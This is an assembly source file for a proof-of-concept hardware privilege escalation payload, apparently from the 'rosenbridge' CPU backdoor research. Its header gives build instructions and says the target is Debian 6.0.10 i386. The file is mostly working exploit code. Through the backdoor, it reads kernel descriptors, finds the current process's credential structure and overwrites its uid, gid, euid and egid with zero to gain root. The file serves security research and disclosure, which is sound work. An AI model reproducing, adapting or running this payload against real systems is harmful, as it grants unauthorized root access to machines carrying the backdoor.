#
# project:rosenbridge
# domas // @xoreaxeaxeax
#

# a proof-of-concept hardware privilege escalation payload.

# uses the deis-backdoor to reach into kernel memory and give the current
# process root permissions.

# written in deis-asm.

# assemble with:
# python ../asm/deis_asm.py payload.asm > payload.h

# to assemble and build the payload into a functioning executable, run make.

# this payload was written as a proof-of-concept against debian 6.0.10 (i386) -
# the constants used would need to be updated to support other kernels.

# gdt_base = get_gdt_base();
lgd eax

#  descriptor = *(uint64_t*)(gdt_base+KERNEL_SEG);
izx 0x78, edx
ada edx

# fs_base=((descriptor&0xff00000000000000ULL)>>32)|
#         ((descriptor&0x000000ff00000000ULL)>>16)|
#         ((descriptor&0x00000000ffff0000ULL)>>16);
ad2 eax
ld4 eax, edx
ad2 eax
ld4 eax, ebx
zl3 ebx
mov edx, eax
la8
ra8
or ebx, eax

# task_struct = *(uint32_t*)(fs_base+OFFSET_TASK_STRUCT);
izx 0x5f20, ecx
izx 0xc133, edx
cmb ecx, edx
ada edx
ld4 eax, eax

# cred = *(uint32_t*)(task_struct+OFFSET_CRED);
izx 0x208, edx
ada edx
ld4 eax, eax

# root = 0
izx 0, edx

# *(uint32_t*)(cred+OFFSET_CRED_VAL_UID) = root;
izx 0x4, ecx
ada ecx
st4 edx, eax

# *(uint32_t*)(cred+OFFSET_CRED_VAL_GID) = root;
ada ecx
st4 edx, eax

# *(uint32_t*)(cred+OFFSET_CRED_VAL_EUID) = root;
ada ecx
ada ecx
st4 edx, eax

# *(uint32_t*)(cred+OFFSET_CRED_VAL_EGID) = root;
ada ecx
st4 edx, eax
